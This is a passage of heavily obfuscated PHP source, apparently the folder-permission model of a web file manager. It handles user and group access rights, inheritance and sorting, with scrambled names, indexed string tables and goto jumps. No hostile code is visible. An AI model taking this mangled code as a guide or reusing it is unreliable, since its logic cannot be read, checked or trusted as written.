$š—™ù‰Í[$ßÍ­åÛ•[1926]] = $ßÍ­åÛ•[391]; $š—™ù‰Í[$ßÍ­åÛ•[1865]] = 0; $š—™ù‰Í[$ßÍ­åÛ•[854]] = 0; } $â¼»û€• = get_path_this($à­â’ı¥); if (strstr($â¼»û€•, $ßÍ­åÛ•[10])) { $š—™ù‰Í[$ßÍ­åÛ•[1807]] += 1; $š—™ù‰Í[$ßÍ­åÛ•[1167]] += 1; } $š—™ù‰Í[$ßÍ­åÛ•[1858]] = $à­â’ı¥; $this->update(); } } goto a¥ğ«ÓÌ‚ø; A­à‰¯é÷Î: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\x75\x72\143\145\x5f\141\x75\164\150"; public function getAuth($Ù¾œ ¨ë) { $àøßÎ¬é =& $_SERVER[ÓïÕü]; $ñºÇßƒ­ = $this->sourceAuthSelect($Ù¾œ ¨ë); $˜ŒäÜ… = array(); $ÇÇ‰Üß½ = array(); $ö™´šã‡ = 2 << 25; foreach ($ñºÇßƒ­ as $çõŠ­Êó) { $³²›Õ­ƒ = Model($àøßÎ¬é[576])->listData($çõŠ­Êó[$àøßÎ¬é[2115]]); if (!$³²›Õ­ƒ) { continue; } $˜ŒäÜ…[] = $çõŠ­Êó; $ºŒÚÈÈ“ = 0; if ($çõŠ­Êó[$àøßÎ¬é[191]] == SourceModel::TYPE_GROUP) { $ºŒÚÈÈ“ = $ö™´šã‡ * 2; } if ($çõŠ­Êó[$àøßÎ¬é[191]] == SourceModel::TYPE_USER) { $ºŒÚÈÈ“ = $ö™´šã‡; } if ($çõŠ­Êó[$àøßÎ¬é[191]] == SourceModel::TYPE_USER && $çõŠ­Êó[$àøßÎ¬é[574]] == $àøßÎ¬é[231]) { $ºŒÚÈÈ“ = 0; } $ÇÇ‰Üß½[] = $³²›Õ­ƒ[$àøßÎ¬é[490]] + $ºŒÚÈÈ“; } array_multisort($ÇÇ‰Üß½, SORT_DESC, $˜ŒäÜ…); return $˜ŒäÜ…; } public function sourceAuthSelect($°ãó€Ú¯) { $ØÚç‚Æô =& $_SERVER[ÓïÕü]; static $Ñ§ãò•ê = array(); $‹İ–·õà = is_array($°ãó€Ú¯) ? !1 : !0; if ($‹İ–·õà) { $°ãó€Ú¯ = array($°ãó€Ú¯); } $Ó Üê®¶ = array(); foreach ($°ãó€Ú¯ as $šğàõÓ¶) { if (isset($Ñ§ãò•ê[$šğàõÓ¶])) { $Ó Üê®¶[$šğàõÓ¶] = $Ñ§ãò•ê[$šğàõÓ¶]; } } if (count($Ó Üê®¶) == count($°ãó€Ú¯)) { return $‹İ–·õà ? $Ó Üê®¶[$°ãó€Ú¯[0]] : $Ó Üê®¶; } $«ÄÈ˜¹Š = $ØÚç‚Æô[2195]; $òĞˆ¾¨† = array($ØÚç‚Æô[194] => array($ØÚç‚Æô[7], $°ãó€Ú¯)); $¥ÇÒÜ³• = $this->field($«ÄÈ˜¹Š)->order($ØÚç‚Æô[478])->where($òĞˆ¾¨†)->select(); $Ä«ÍÎİ· = array_to_keyvalue_group($¥ÇÒÜ³•, $ØÚç‚Æô[194]); foreach ($°ãó€Ú¯ as $šğàõÓ¶) { $Ñ§ãò•ê[$šğàõÓ¶] = $Ä«ÍÎİ·[$šğàõÓ¶] ? $Ä«ÍÎİ·[$šğàõÓ¶] : array(); } if ($‹İ–·õà) { return $¥ÇÒÜ³•; } return $Ä«ÍÎİ·; } public function setAuth($²ø€‡ìÀ, $úÁªô¥‹) { $ƒûæİİÈ =& $_SERVER[ÓïÕü]; $Ç÷ÍöÄ = Model($ƒûæİİÈ[1456])->sourceInfo($²ø€‡ìÀ); if (!$Ç÷ÍöÄ) { return !1; } if ($Ç÷ÍöÄ[$ƒûæİİÈ[191]] != SourceModel::TYPE_GROUP) { return !1; } $¦ù×ø¹ˆ = 1; $äƒúÈëñ = $Ç÷ÍöÄ[$ƒûæİİÈ[574]]; if ($äƒúÈëñ != $¦ù×ø¹ˆ) { $¸¨¼·© = array($ƒûæİİÈ[1418] => $äƒúÈëñ); $“ØÒ¬òŞ = Model($ƒûæİİÈ[2101])->field($ƒûæİİÈ[1806])->where($¸¨¼·©)->select(); $“ØÒ¬òŞ = array_to_keyvalue($“ØÒ¬òŞ, $ƒûæİİÈ[12], $ƒûæİİÈ[1806]); } $«¥’æ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $‹‡Ñ²Õ = array(); foreach ($úÁªô¥‹ as $‹‘¡‡µ) { if (!in_array($‹‘¡‡µ[$ƒûæİİÈ[191]], $«¥’æ)) { show_json(LNG($ƒûæİİÈ[2196]), !1); } if ($äƒúÈëñ != $¦ù×ø¹ˆ) { if ($‹‘¡‡µ[$ƒûæİİÈ[191]] == SourceModel::TYPE_GROUP) { } if ($‹‘¡‡µ[$ƒûæİİÈ[574]] != 0 && !in_array($‹‘¡‡µ[$ƒûæİİÈ[574]], $“ØÒ¬òŞ)) { } } if ($‹‘¡‡µ[$ƒûæİİÈ[574]] == 0) { $‹‘¡‡µ[$ƒûæİİÈ[191]] = SourceModel::TYPE_USER; } $‹‡Ñ²Õ[] = array($ƒûæİİÈ[194] => $²ø€‡ìÀ, $ƒûæİİÈ[191] => intval($‹‘¡‡µ[$ƒûæİİÈ[191]]), $ƒûæİİÈ[574] => intval($‹‘¡‡µ[$ƒûæİİÈ[574]]), $ƒûæİİÈ[2115] => intval($‹‘¡‡µ[$ƒûæİİÈ[2115]]) ? intval($‹‘¡‡µ[$ƒûæİİÈ[2115]]) : 0, $ƒûæİİÈ[2178] => intval($‹‘¡‡µ[$ƒûæİİÈ[2178]]) ? intval($‹‘¡‡µ[$ƒûæİİÈ[2178]]) : -1); } $this->where(array($ƒûæİİÈ[494] => $²ø€‡ìÀ))->delete(); $this->addAll($‹‡Ñ²Õ); return !0; } public function authClear($æâõ­Ô”) { $íˆ·¬¹› =& $_SERVER[ÓïÕü]; $ğ´ÃÎµÂ = Model($íˆ·¬¹›[1456])->sourceInfo($æâõ­Ô”); $ŸÅ ã” = array($æâõ­Ô”); if ($ğ´ÃÎµÂ[$íˆ·¬¹›[488]] == $íˆ·¬¹›[91]) { $èú—ƒŸâ = array($íˆ·¬¹›[660] => array($íˆ·¬¹›[620], $ğ´ÃÎµÂ[$íˆ·¬¹›[589]] . $æâõ­Ô” . $íˆ·¬¹›[621])); $ŸÅ ã” = Model($íˆ·¬¹›[1456])->field($íˆ·¬¹›[494])->where($èú—ƒŸâ)->getField($íˆ·¬¹›[194], !0); $ŸÅ ã”[] = $æâõ­Ô”; } $this->where(array($íˆ·¬¹›[494] => array($íˆ·¬¹›[495], $ŸÅ ã”)))->delete(); return !0; } public function getAllChildren($ƒ’¦õ) { $ö˜‹¼´ =& $_SERVER[ÓïÕü]; $ƒú™Ş ¸ = Model($ö˜‹¼´[1456])->sourceInfo($ƒ’¦õ); if ($ƒú™Ş ¸[$ö˜‹¼´[488]] != $ö˜‹¼´[91]) { return $this->sourceListAuth(array($ƒ’¦õ)); } if ($ƒú™Ş ¸[$ö˜‹¼´[191]] != SourceModel::TYPE_GROUP) { return array(); } $±óï¾Ş = 1; $¨‘ŸåŸ = array($ƒ’¦õ); if ($ƒú™Ş ¸[$ö˜‹¼´[193]] == $ö˜‹¼´[231] && $ƒú™Ş ¸[$ö˜‹¼´[574]] != $±óï¾Ş) { $¨‘ŸåŸ = $this->groupChidldAllRootSource($ƒú™Ş ¸[$ö˜‹¼´[574]]); } $Àïˆæåı = $this->field($ö˜‹¼´[194])->group($ö˜‹¼´[194])->select(); $Àïˆæåı = array_to_keyvalue($Àïˆæåı, $ö˜‹¼´[12], $ö˜‹¼´[194]); if (!$Àïˆæåı) { return array(); } $ø÷‡¨öÎ = $ö˜‹¼´[2197]; $É›Ù²¸ = array($ö˜‹¼´[194] => array($ö˜‹¼´[7], $Àïˆæåı), $ö˜‹¼´[508] => $ö˜‹¼´[231]); $ ·‘æ§¤ = Model($ö˜‹¼´[921])->field($ø÷‡¨öÎ)->where($É›Ù²¸)->select(); $ÔêÀâÃ¶ = array($ƒ’¦õ); foreach ($ ·‘æ§¤ as $ÙÈˆôÃ) { foreach ($¨‘ŸåŸ as $Ù£â£¿½) { $º´õÈÖ = $ö˜‹¼´[50] . $Ù£â£¿½ . $ö˜‹¼´[50]; $£ÉºûÕÆ = $ÙÈˆôÃ[$ö˜‹¼´[589]] . $ÙÈˆôÃ[$ö˜‹¼´[194]] . $ö˜‹¼´[50]; if (strstr($£ÉºûÕÆ, $º´õÈÖ)) { $ÔêÀâÃ¶[] = $ÙÈˆôÃ[$ö˜‹¼´[194]]; break; } } } return $this->sourceListAuth($ÔêÀâÃ¶); } private function sourceListAuth($À‹©²é¹) { $¿µº½³ =& $_SERVER[ÓïÕü]; $¥Ã“ŒÄ¹ = Model($¿µº½³[1456])->sourceListInfo($À‹©²é¹, !0); $ß¿¼Öãó = $this->sourceAuthSelect($À‹©²é¹); $¢­Òµ‡å = array(); $ÉÚ÷ÂÕµ = array(); foreach ($¥Ã“ŒÄ¹ as $Ê»ƒ’íñ) { unset($Ê»ƒ’íñ[$¿µº½³[532]]); unset($Ê»ƒ’íñ[$¿µº½³[530]]); unset($Ê»ƒ’íñ[$¿µº½³[490]]); unset($Ê»ƒ’íñ[$¿µº½³[90]]); $Ô×’›±ø = $ß¿¼Öãó[$Ê»ƒ’íñ[$¿µº½³[194]]]; if (!$Ô×’›±ø) { continue; } $Ê»ƒ’íñ[$¿µº½³[2198]] = $this->authTargetInfo($Ô×’›±ø); $Ê»ƒ’íñ[$¿µº½³[587]] = rtrim($Ê»ƒ’íñ[$¿µº½³[593]], $¿µº½³[8]) . $¿µº½³[8] . ltrim($Ê»ƒ’íñ[$¿µº½³[587]], $¿µº½³[8]); $¢­Òµ‡å[] = $Ê»ƒ’íñ; $â¦˜å´½ = count(explode($¿µº½³[8], trim($Ê»ƒ’íñ[$¿µº½³[587]], $¿µº½³[8]))); $ÉÚ÷ÂÕµ[] = $â¦˜å´½ + ($Ê»ƒ’íñ[$¿µº½³[33]] == $¿µº½³[78] ? 0 : 1000); } array_multisort($ÉÚ÷ÂÕµ, SORT_ASC, $¢­Òµ‡å); return $¢­Òµ‡å; } private function groupChidldAllRootSource($Ôô†˜–) { $¨“ëÚÌ¢ =& $_SERVER[ÓïÕü]; $Áıà€§¬ = Model($¨“ëÚÌ¢[1416])->groupChildrenAll($Ôô†˜–); $Şíü¨÷… = array($¨“ëÚÌ¢[193] => 0, $¨“ëÚÌ¢[574] => array($¨“ëÚÌ¢[7], $Áıà€§¬), $¨“ëÚÌ¢[191] => SourceModel::TYPE_GROUP); $¸âš¤ËÊ = Model($¨“ëÚÌ¢[921])->field($¨“ëÚÌ¢[194])->where($Şíü¨÷…)->select(); $¸âš¤ËÊ = array_to_keyvalue($¸âš¤ËÊ, $¨“ëÚÌ¢[12], $¨“ëÚÌ¢[194]); return $¸âš¤ËÊ; } private function authTargetInfo($Åİö˜¯×) { $èºß– =& $_SERVER[ÓïÕü]; $ß¹««É = array(); $†Ï¶¾ÎÚ = array(); $ÃÅŞªäÀ = 2 << 25; foreach ($Åİö˜¯× as $Ğ®äÉÊ) { $úıÜÛó• = Model($èºß–[576])->listData($Ğ®äÉÊ[$èºß–[2115]]); if (!$úıÜÛó•) { continue; } if ($Ğ®äÉÊ[$èºß–[191]] == SourceModel::TYPE_USER) { $íæåÔ¶÷ = Model($èºß–[582])->getInfoSimpleOuter($Ğ®äÉÊ[$èºß–[574]]); if ($íæåÔ¶÷[$èºß–[1806]] == $èºß–[1301]) { continue; } if ($íæåÔ¶÷[$èºß–[1806]] == $èºß–[231]) { $íæåÔ¶÷[$èºß–[32]] = LNG($èºß–[2199]); } } else { $íæåÔ¶÷ = Model($èºß–[590])->getInfoSimple($Ğ®äÉÊ[$èºß–[574]]); } if (!$íæåÔ¶÷) { continue; } $íæåÔ¶÷[$èºß–[545]] = $úıÜÛó•; $ß¹««É[] = $íæåÔ¶÷; $—²Òîà± = 0; if ($Ğ®äÉÊ[$èºß–[191]] == SourceModel::TYPE_GROUP) { $—²Òîà± = $ÃÅŞªäÀ * 2; } if ($Ğ®äÉÊ[$èºß–[191]] == SourceModel::TYPE_USER) { $—²Òîà± = $ÃÅŞªäÀ; } if ($Ğ®äÉÊ[$èºß–[191]] == SourceModel::TYPE_USER && $Ğ®äÉÊ[$èºß–[574]] == $èºß–[231]) { $—²Òîà± = 0; } $†Ï¶¾ÎÚ[] = $úıÜÛó•[$èºß–[490]] + $—²Òîà±; } array_multisort($†Ï¶¾ÎÚ, SORT_DESC, $ß¹««É); return $ß¹««É; } public function getAllChildrenByUser($ Ãüƒ¬ô, $Å™Œ×ØÒ) { $œ©ô´»• =& $_SERVER[ÓïÕü]; $¤Âü¾½† = Model($œ©ô´»•[602])->getInfo($Å™Œ×ØÒ); if (!$Å™Œ×ØÒ || !$ Ãüƒ¬ô || !$¤Âü¾½†) { return array(); } $½×Ü°ƒê = Model($œ©ô´»•[1456])->sourceInfo($ Ãüƒ¬ô); $«µ¥¶ö÷ = array(); $óó€¯ñç = 1; if ($½×Ü°ƒê[$œ©ô´»•[193]] == $œ©ô´»•[231] && $½×Ü°ƒê[$œ©ô´»•[574]] != $óó€¯ñç && $this->groupContainUser($½×Ü°ƒê[$œ©ô´»•[574]], $Å™Œ×ØÒ)) { foreach ($¤Âü¾½†[$œ©ô´»•[1417]] as $Îªë¿ÑÏ) { $Ä®›Ë†É = Model($œ©ô´»•[590])->getInfo($Îªë¿ÑÏ[$œ©ô´»•[1418]]); $Â‰±º“¤ = Model($œ©ô´»•[602])->getInfoSimpleOuter($Å™Œ×ØÒ); $Â‰±º“¤[$œ©ô´»•[545]] = $Îªë¿ÑÏ[$œ©ô´»•[490]]; if (Model($œ©ô´»•[576])->authCheckAction($Îªë¿ÑÏ[$œ©ô´»•[490]][$œ©ô´»•[490]], $œ©ô´»•[2027])) { continue; } $¦¶×Ù¤¾ = array($œ©ô´»•[32] => $œ©ô´»•[1321] . $Ä®›Ë†É[$œ©ô´»•[32]], $œ©ô´»•[194] => $Ä®›Ë†É[$œ©ô´»•[90]][$œ©ô´»•[194]], $œ©ô´»•[87] => KodIO::make($Ä®›Ë†É[$œ©ô´»•[90]][$œ©ô´»•[194]]), $œ©ô´»•[193] => $œ©ô´»•[231], $œ©ô´»•[191] => $œ©ô´»•[583], $œ©ô´»•[33] => $œ©ô´»•[624], $œ©ô´»•[587] => $Ä®›Ë†É[$œ©ô´»•[594]], $œ©ô´»•[1418] => $Ä®›Ë†É[$œ©ô´»•[1418]], $œ©ô´»•[591] => $Ä®›Ë†É[$œ©ô´»•[193]], $œ©ô´»•[2198] => array($Â‰±º“¤)); $«µ¥¶ö÷[$¦¶×Ù¤¾[$œ©ô´»•[194]]] = $¦¶×Ù¤¾; } } $ä»åôñ = array(); $ï®¼ôíÂ = $this->getAllChildren($ Ãüƒ¬ô); foreach ($ï®¼ôíÂ as $–†Ù®œ) { $ÃÊ»”Ñ = !1; foreach ($–†Ù®œ[$œ©ô´»•[2198]] as $¾´Ê“é¤) { if ($¾´Ê“é¤[$œ©ô´»•[1806]]) { if ($¾´Ê“é¤[$œ©ô´»•[1806]] == $Å™Œ×ØÒ) { $ÃÊ»”Ñ = !0; break; } } if ($¾´Ê“é¤[$œ©ô´»•[1418]]) { if ($this->groupContainUser($¾´Ê“é¤[$œ©ô´»•[1418]], $Å™Œ×ØÒ)) { $ÃÊ»”Ñ = !0; break; } } } if ($ÃÊ»”Ñ) { $ä»åôñ[] = $–†Ù®œ; } $è×õ—–¾ = $–†Ù®œ[$œ©ô´»•[194]]; if (isset($«µ¥¶ö÷[$è×õ—–¾])) { $–†Ù®œ[$œ©ô´»•[2198]][] = $«µ¥¶ö÷[$è×õ—–¾][0]; $«µ¥¶ö÷[$è×õ—–¾] = !1; } } $«µ¥¶ö÷ = array_filter(array_values($«µ¥¶ö÷)); $ä»åôñ = array_merge($«µ¥¶ö÷, $ä»åôñ); return $ä»åôñ; } public function setAllChildrenByUser($üªŒæûá, $´ËÙãö, $Ú¼“ùö) { $««¦ìÊÑ =& $_SERVER[ÓïÕü]; $¦á¬½› = $this->getAllChildrenByUser($üªŒæûá, $´ËÙãö); if (!$Ú¼“ùö || !$¦á¬½›) { return !1; } foreach ($¦á¬½› as $øõ™–÷) { $ò‡ÂÏ¬ = array(); foreach ($øõ™–÷[$««¦ìÊÑ[2198]] as $”äø— Ÿ) { $ì‹Şœ§‡ = $”äø— Ÿ[$««¦ìÊÑ[545]]; $¶Œæö¬¯ = $”äø— Ÿ[$««¦ìÊÑ[1806]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $§¾Úš× = $”äø— Ÿ[$««¦ìÊÑ[1806]] ? $”äø— Ÿ[$««¦ìÊÑ[1806]] : $”äø— Ÿ[$««¦ìÊÑ[1418]]; if ($”äø— Ÿ[$««¦ìÊÑ[1806]] && $”äø— Ÿ[$««¦ìÊÑ[1806]] == $´ËÙãö) { continue; } $ò‡ÂÏ¬[] = array($««¦ìÊÑ[194] => $øõ™–÷[$««¦ìÊÑ[194]], $««¦ìÊÑ[191] => $¶Œæö¬¯, $««¦ìÊÑ[574] => intval($§¾Úš×), $««¦ìÊÑ[2115] => isset($ì‹Şœ§‡[$««¦ìÊÑ[478]]) ? intval($ì‹Şœ§‡[$««¦ìÊÑ[478]]) : 0, $««¦ìÊÑ[2178] => isset($ì‹Şœ§‡[$««¦ìÊÑ[2178]]) ? intval($ì‹Şœ§‡[$««¦ìÊÑ[2178]]) : -1); } $ò‡ÂÏ¬[] = array($««¦ìÊÑ[194] => $øõ™–÷[$««¦ìÊÑ[194]], $««¦ìÊÑ[191] => SourceModel::TYPE_USER, $««¦ìÊÑ[574] => intval($´ËÙãö), $««¦ìÊÑ[2115] => intval($Ú¼“ùö), $««¦ìÊÑ[2178] => -1); $this->where(array($««¦ìÊÑ[494] => $øõ™–÷[$««¦ìÊÑ[194]]))->delete(); $this->addAll($ò‡ÂÏ¬); } return !0; } public function get($ÈÕâ›–›) { $Ğ˜êá—¯ = $this->getSourceList(array($ÈÕâ›–›), !0); return $Ğ˜êá—¯[0]; } public function getSourceList($Ä—ÇÛ¶ä, $¯àÙòŞ× = false, $àçÒ¸íü = false) { $§âÔéğÍ =& $_SERVER[ÓïÕü]; if (!$Ä—ÇÛ¶ä) { return array(); } $ÚªÎúÔ‰ = Model($§âÔéğÍ[1456]); if (!$¯àÙòŞ× && count($Ä—ÇÛ¶ä) == 1) { $¯àÙòŞ× = array(); $¯àÙòŞ×[$Ä—ÇÛ¶ä[0]] = $ÚªÎúÔ‰->sourceInfo($Ä—ÇÛ¶ä[0]); } if (!$¯àÙòŞ×) { $®¨õ÷Ëï = array($§âÔéğÍ[494] => array($§âÔéğÍ[495], $Ä—ÇÛ¶ä)); $¯àÙòŞ× = $ÚªÎúÔ‰->field($§âÔéğÍ[2200])->where($®¨õ÷Ëï)->select(); $¯àÙòŞ× = array_to_keyvalue($¯àÙòŞ×, $§âÔéğÍ[194]); } $·ñù£° = $Ä—ÇÛ¶ä; foreach ($¯àÙòŞ× as $·ã•£³÷ => $Ô‹æ¸×å) { $…¢ ¨¶‘ = $ÚªÎúÔ‰->parentLevelArray($Ô‹æ¸×å[$§âÔéğÍ[589]]); $·ñù£° = array_merge($·ñù£°, array($·ã•£³÷), array_reverse($…¢ ¨¶‘)); } $·ñù£° = array_values(array_unique($·ñù£°)); if (!$·ñù£°) { return array(); } $ˆ¯÷Æ®ú = $this->sourceAuthSelect($·ñù£°); $ä·½¬á = array(); foreach ($·ñù£° as $ê¹óãš) { if (isset($ˆ¯÷Æ®ú[$ê¹óãš])) { $ä·½¬á[$ê¹óãš] = $ˆ¯÷Æ®ú[$ê¹óãš]; } } $ƒÊää¦ó = $this->userIsRoot($àçÒ¸íü); $ìúõüôõ = AuthModel::authAll(); $Êæ¶¢¬× = array($§âÔéğÍ[491] => $ìúõüôõ, $§âÔéğÍ[2201] => array($§âÔéğÍ[496] => 0, $§âÔéğÍ[2012] => $ìúõüôõ, $§âÔéğÍ[497] => LNG($§âÔéğÍ[2202]), $§âÔéğÍ[2029] => $§âÔéğÍ[2203])); $°”ÊıØÂ = array(); foreach ($¯àÙòŞ× as $ê¹óãš => $üÊœ’ºº) { if ($ƒÊää¦ó && $GLOBALS[$§âÔéğÍ[6]][$§âÔéğÍ[2025]]) { $°”ÊıØÂ[$ê¹óãš] = $Êæ¶¢¬×; continue; } $°”ÊıØÂ[$ê¹óãš] = $this->makeSourceAuth($üÊœ’ºº, $ä·½¬á, $àçÒ¸íü); } return $°”ÊıØÂ; } public function authDeepCheck($¦¶ÙìûÕ, $‚Ô¦œò = false) { $êğƒ½‹š =& $_SERVER[ÓïÕü]; $‚Ô¦œò = $‚Ô¦œò ? $‚Ô¦œò : USER_ID; $“¿ËšŞ = $this->makeAuthDeep($‚Ô¦œò); if (!in_array($¦¶ÙìûÕ, $“¿ËšŞ[$êğƒ½‹š[2204]])) { return !1; } $‚áµ©¥» = array(); foreach ($“¿ËšŞ[$êğƒ½‹š[2205]] as $ˆ÷óŞÆ => $¶ˆ½®óÓ) { if (!in_array($¦¶ÙìûÕ, $¶ˆ½®óÓ)) { continue; } $‚áµ©¥»[] = $ˆ÷óŞÆ; } if (!$‚áµ©¥») { return !1; } $ÇüŠ¹ØÜ = $‚áµ©¥» ? $‚áµ©¥»[0] : $¦¶ÙìûÕ; return array($êğƒ½‹š[491] => -1, $êğƒ½‹š[545] => array($êğƒ½‹š[496] => $êğƒ½‹š[1301], $êğƒ½‹š[2012] => $êğƒ½‹š[231], $êğƒ½‹š[497] => LNG($êğƒ½‹š[2206]), $êğƒ½‹š[2029] => $êğƒ½‹š[2207]), $êğƒ½‹š[2208] => LNG($êğƒ½‹š[2209]), $êğƒ½‹š[2210] => $this->sourceAuthInfo($ÇüŠ¹ØÜ)); } protected function makeAuthDeep($üéØ×• = false) { $º…•ûéë =& $_SERVER[ÓïÕü]; static $õå’ƒßá = array(); $üéØ×• = $üéØ×• ? $üéØ×• : USER_ID; if (isset($õå’ƒßá[$üéØ×•])) { return $õå’ƒßá[$üéØ×•]; } $„ğÏö¯  = Model($º…•ûéë[2211])->listData(); $£Ï†ÔÁ˜ = array(); foreach ($„ğÏö¯  as $Šµø ·ı) { if ($Šµø ·ı[$º…•ûéë[490]] == 0 && $Šµø ·ı[$º…•ûéë[2028]] == $º…•ûéë[91]) { $£Ï†ÔÁ˜[] = $Šµø ·ı[$º…•ûéë[478]]; } } $ÃÌî¹õ = $this->userGroupParents($üéØ×•); $ñÀ÷‚À¼ = array($º…•ûéë[191] => SourceModel::TYPE_USER, $º…•ûéë[574] => $üéØ×•); if ($ÃÌî¹õ) { $ñÀ÷‚À¼ = array(array($º…•ûéë[191] => SourceModel::TYPE_USER, $º…•ûéë[574] => $üéØ×•), array($º…•ûéë[191] => SourceModel::TYPE_GROUP, $º…•ûéë[574] => array($º…•ûéë[495], $ÃÌî¹õ)), $º…•ûéë[1104] => $º…•ûéë[2109]); } $Ã—åÌÛÈ = $this->field($º…•ûéë[2212])->where($ñÀ÷‚À¼)->select(); $ÊşÑíÖÊ = array(); $çãÌÃü± = array_to_keyvalue_group($Ã—åÌÛÈ, $º…•ûéë[194]); foreach ($çãÌÃü± as $ÑÈšÉ‘˜ => $î‹¯ùõ) { $«ˆ©ßªß = $this->authArrayCheck($î‹¯ùõ, $üéØ×•); if ($«ˆ©ßªß[$º…•ûéë[491]] > 0) { $ÊşÑíÖÊ[] = $ÑÈšÉ‘˜ . $º…•ûéë[12]; } } if ($ÃÌî¹õ) { $¤‘éûÈ = Model($º…•ûéë[590]); foreach ($ÃÌî¹õ as $õ‡ğ’) { $¾ñÑò¤ = $¤‘éûÈ->getInfo($õ‡ğ’); if (!$¾ñÑò¤ || !is_array($¾ñÑò¤[$º…•ûéë[90]])) { continue; } $ÊşÑíÖÊ[] = $¾ñÑò¤[$º…•ûéë[90]][$º…•ûéë[194]]; } } $¦¤´ÁìÀ = array(); $ß½ÅàóÖ = $ÃÌî¹õ; $èÉ„›Œ’ = Model($º…•ûéë[1456]); $¤‘éûÈ = Model($º…•ûéë[590]); $£œÇ¢¾ = array(); $È¨ÖÓëû = array(); $Ü¹˜”•³ = array(); $íæªâ†± = array(); if ($ÊşÑíÖÊ) { $õ­É¿­ = $èÉ„›Œ’->where(array($º…•ûéë[194] => array($º…•ûéë[495], $ÊşÑíÖÊ)))->select(); foreach ($õ­É¿­ as $ñ©¢Ø”) { if ($ñ©¢Ø”[$º…•ûéë[508]] == $º…•ûéë[91]) { continue; } $È™¸ú¬ı = $èÉ„›Œ’->parentLevelArray($ñ©¢Ø”[$º…•ûéë[589]]); $¦¤´ÁìÀ = array_merge($¦¤´ÁìÀ, $È™¸ú¬ı); $ß½ÅàóÖ[] = $ñ©¢Ø”[$º…•ûéë[574]]; $£œÇ¢¾[$ñ©¢Ø”[$º…•ûéë[194]]] = $È™¸ú¬ı; $È¨ÖÓëû[$ñ©¢Ø”[$º…•ûéë[194]]] = $ñ©¢Ø”[$º…•ûéë[574]]; } } $ß½ÅàóÖ = array_values(array_unique($ß½ÅàóÖ)); $À»¼ëÏÛ = $ß½ÅàóÖ; foreach ($À»¼ëÏÛ as $õ‡ğ’) { $¾ñÑò¤ = $¤‘éûÈ->getInfo($õ‡ğ’); $È™¸ú¬ı = $èÉ„›Œ’->parentLevelArray($¾ñÑò¤[$º…•ûéë[589]]); $ß½ÅàóÖ = array_merge($ß½ÅàóÖ, $È™¸ú¬ı); } $ß½ÅàóÖ = array_values(array_unique($ß½ÅàóÖ)); foreach ($ß½ÅàóÖ as $õ‡ğ’) { $¾ñÑò¤ = $¤‘éûÈ->getInfo($õ‡ğ’); $¦¤´ÁìÀ[] = $¾ñÑò¤[$º…•ûéë[90]][$º…•ûéë[194]]; $Ü¹˜”•³[$õ‡ğ’] = $¾ñÑò¤[$º…•ûéë[90]][$º…•ûéë[194]]; $íæªâ†±[$õ‡ğ’] = $èÉ„›Œ’->parentLevelArray($¾ñÑò¤[$º…•ûéë[589]]); } foreach ($£œÇ¢¾ as $‰ĞÙ×¨ö => $Üå»ÓÁ) { $ÓÔ®Û¤¢ = $È¨ÖÓëû[$‰ĞÙ×¨ö]; if (!$ÓÔ®Û¤¢ || !$Ü¹˜”•³[$ÓÔ®Û¤¢]) { continue; } $¼ÎÑêò× = array(); foreach ($íæªâ†±[$ÓÔ®Û¤¢] as $õ‡ğ’) { $¼ÎÑêò×[] = $Ü¹˜”•³[$õ‡ğ’]; } $£œÇ¢¾[$‰ĞÙ×¨ö] = array_merge($¼ÎÑêò×, $Üå»ÓÁ); } $¦¤´ÁìÀ = array_values(array_unique($¦¤´ÁìÀ)); $„ûñêõÆ = array($º…•ûéë[2204] => $¦¤´ÁìÀ, $º…•ûéë[2205] => $£œÇ¢¾); $õå’ƒßá[$üéØ×•] = $„ûñêõÆ; return $„ûñêõÆ; } private function makeSourceAuth($ñÓİÕÆª, $’è°»Ò, $ÖæèîÇè = false) { $ƒÊòĞŠ =& $_SERVER[ÓïÕü]; $«÷˜Â† = $ƒÊòĞŠ[91]; $³Ÿ²É£• = $ñÓİÕÆª[$ƒÊòĞŠ[574]]; $Å‰ÀÙƒë = $ñÓİÕÆª[$ƒÊòĞŠ[191]] == SourceModel::TYPE_GROUP; $…­­‘´Í = $Å‰ÀÙƒë ? $this->groupRootAuth($³Ÿ²É£•, $ÖæèîÇè) : !1; if ($…­­‘´Í && Model($ƒÊòĞŠ[576])->authCheckAction($…­­‘´Í[$ƒÊòĞŠ[490]], $ƒÊòĞŠ[2027])) { return $this->groupAuthInfo($…­­‘´Í, $³Ÿ²É£•); } $ÈÉáü­¼ = Model($ƒÊòĞŠ[1456])->parentLevelArray($ñÓİÕÆª[$ƒÊòĞŠ[589]]); $ÈÉáü­¼ = array_merge(array($ñÓİÕÆª[$ƒÊòĞŠ[194]]), array_reverse($ÈÉáü­¼)); $ÜÂäš¬× = !1; foreach ($ÈÉáü­¼ as $³ˆ»ã„è) { if (!isset($’è°»Ò[$³ˆ»ã„è])) { continue; } $æ¨ËšŒ = $this->authMake($’è°»Ò[$³ˆ»ã„è], $ÖæèîÇè); if ($æ¨ËšŒ[$ƒÊòĞŠ[545]]) { $ÜÂäš¬× = $æ¨ËšŒ; break; } } if (!$Å‰ÀÙƒë) { return $ÜÂäš¬×; } if (!$ÜÂäš¬× && $…­­‘´Í) { $ÜÂäš¬× = $this->groupAuthInfo($…­­‘´Í, $³Ÿ²É£•); } if (!$ÜÂäš¬×) { $¤›·»ä” = Model($ƒÊòĞŠ[590])->getInfo($³Ÿ²É£•); $‘©çèŒ = explode($ƒÊòĞŠ[50], trim($¤›·»ä”[$ƒÊòĞŠ[589]], $ƒÊòĞŠ[50])); $‘©çèŒ = array_reverse($‘©çèŒ); foreach ($‘©çèŒ as $Ê¿Ã‡“¦) { if ($Ê¿Ã‡“¦ == $ƒÊòĞŠ[231] || $Ê¿Ã‡“¦ == $«÷˜Â†) { continue; } $õëÃ²€¥ = $this->groupRootAuth($Ê¿Ã‡“¦, $ÖæèîÇè); if (!$õëÃ²€¥) { continue; } $ÜÂäš¬× = $this->groupAuthInfo($õëÃ²€¥, $Ê¿Ã‡“¦); break; } } if (!$ÜÂäš¬× || $ÜÂäš¬×[$ƒÊòĞŠ[491]] <= 0) { $¾º—õ´ø = $this->authDeepCheck($ñÓİÕÆª[$ƒÊòĞŠ[194]], $ÖæèîÇè); if ($¾º—õ´ø) { $ÜÂäš¬× = $¾º—õ´ø; } } return $ÜÂäš¬×; } private function userIsRoot($Ñ‘©á·£ = false) { $ƒ±ºÍÊë =& 